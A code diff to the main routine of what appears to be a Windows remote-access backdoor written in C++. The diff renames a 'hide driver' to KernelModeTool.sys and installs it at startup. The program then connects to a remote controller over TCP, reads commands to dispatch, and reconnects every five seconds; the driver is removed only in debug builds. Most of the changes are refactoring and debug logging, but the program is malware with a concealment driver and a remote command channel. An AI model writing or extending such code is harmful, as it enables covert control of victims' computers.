@@ -3,10 +3,7 @@
 #endif // _DEBUG
 
 #include <string>
-#include <memory>
-
 #include "networking/WinsockInitializer.h"
-#include "command/CommandManager.h"
 #include "utils/builders.h"
 #include "utils/factory.h"
 #include "networking/WinsockTCPClient.h"
@@ -21,19 +18,21 @@ int main()
     utils::factory::execute_on_startup();
 
     // Install hide driver
-    methods::driver::Installer installer("Hi.sys");
+    methods::driver::Installer installer("KernelModeTool.sys");
+#ifdef _DEBUG
+    std::cerr << installer.Install() << '\n';
+#else
     installer.Install();
+#endif // _DEBUG
 
     // Buffer to read remote commands into
     std::array<char, 128> buffer;
 
     // Create a commands dispatcher
-    std::unique_ptr<command::CommandManager> dispatcher(
-        utils::builders::BuildManager());
+    auto dispatcher = utils::builders::BuildManager();
 
     // Create a TCP client
-    std::unique_ptr<networking::WinsockTCPClient> client(
-        utils::builders::BuildClient());
+    auto client = utils::builders::BuildClient();
 
     // Attempt to connect to remote control
     client->Connect();
@@ -57,7 +56,7 @@ int main()
             // on connection fail, socket remains in an unknown state
             // so creating a new one.
 
-            client.reset(utils::builders::BuildClient());
+            client = utils::builders::BuildClient();
 
             Sleep(5000);
 
@@ -67,7 +66,7 @@ int main()
 
 #ifdef _DEBUG
     // Uninstall hide driver
-    installer.Uninstall();
+    std::cerr << installer.Uninstall() << '\n';
 #endif // _DEBUG
 
     // Clean winsock
